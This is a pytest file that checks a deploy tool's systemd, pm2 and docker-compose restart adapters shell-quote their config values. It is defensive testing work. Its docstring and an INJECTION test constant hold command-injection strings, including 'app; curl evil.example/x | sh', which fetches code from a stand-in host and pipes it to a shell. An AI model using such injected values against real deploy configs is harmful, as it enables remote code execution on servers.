"""Restart adapters build shell commands from config — those values must be quoted.

`health.py` in this same package already treats deploy config as untrusted, with an
explicit note that a crafted `HealthConfig.method` could inject (`"GET && curl evil.com"`),
and `engine.py` shlex-quotes `push.target` before interpolating it. The restart adapters
did neither: service names, the compose file and the app root went into the command
string raw — and `DockerComposeAdapter` receives the *same* `push.target` that
`engine.py` is careful to quote.

Nothing here claims a dramatic exploit: `deploy.yaml` is normally written by the operator.
It is an inconsistency inside one module's own threat model, and a path containing a
space was enough to break the command regardless of intent.

`shlex.quote` only adds quotes when a value needs them, so ordinary names like `myapp`
are unchanged — these tests pin both halves.

`CommandAdapter` is deliberately excluded: running an arbitrary operator-supplied
command is its entire purpose, and quoting it would break the feature.
"""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from navig.deploy.adapters import (
    CommandAdapter,
    DockerComposeAdapter,
    Pm2Adapter,
    SystemdAdapter,
)

KW = {"server_config": {}, "remote_ops": MagicMock(), "dry_run": True}

INJECTION = "app; curl evil.example/x | sh"
WITH_SPACE = "/srv/my app"


# ── ordinary values are untouched ───────────────────────────────────────────────


@pytest.mark.parametrize(
    ("adapter", "expected"),
    [
        (SystemdAdapter(service="myapp", **KW), "systemctl restart myapp"),
        (Pm2Adapter(service="myapp", **KW), "pm2 restart myapp --update-env"),
    ],
)
def test_simple_names_are_not_rewritten(adapter, expected: str) -> None:
    assert adapter.restart_commands() == [expected]


def test_docker_compose_simple_paths_are_not_rewritten() -> None:
    cmd = DockerComposeAdapter(app_root="/srv/app", compose_file="docker-compose.yml", **KW)

    assert cmd.restart_commands() == [
        "cd /srv/app && docker compose -f docker-compose.yml up -d --remove-orphans"
    ]


# ── metacharacters are neutralised ──────────────────────────────────────────────


def test_systemd_service_name_is_quoted() -> None:
    (command,) = SystemdAdapter(service=INJECTION, **KW).restart_commands()

    assert "curl evil.example" not in command.split("'")[0]
    assert command.startswith("systemctl restart '")


def test_pm2_service_name_is_quoted() -> None:
    (command,) = Pm2Adapter(service=INJECTION, **KW).restart_commands()

    assert command.startswith("pm2 restart '")
    assert command.endswith("--update-env")


def test_docker_compose_app_root_is_quoted() -> None:
    (command,) = DockerComposeAdapter(
        app_root=INJECTION, compose_file="docker-compose.yml", **KW
    ).restart_commands()

    # the injected `;` must be inside quotes, not a command separator
    assert command.startswith("cd '")
    prefix = command.split("&&")[0]
    assert prefix.count("'") == 2


def test_docker_compose_file_is_quoted() -> None:
    (command,) = DockerComposeAdapter(
        app_root="/srv/app", compose_file=INJECTION, **KW
    ).restart_commands()

    assert "-f '" in command


def test_a_path_with_a_space_stays_one_argument() -> None:
    """The plain-bad-luck case, no attacker required."""
    (command,) = DockerComposeAdapter(
        app_root=WITH_SPACE, compose_file="docker-compose.yml", **KW
    ).restart_commands()

    assert f"cd '{WITH_SPACE}'" in command


def test_command_adapter_is_deliberately_left_raw() -> None:
    """Running an arbitrary command is the feature; quoting it would break it."""
    raw = "systemctl restart a && systemctl restart b"

    assert CommandAdapter(command=raw, **KW).restart_commands() == [raw]
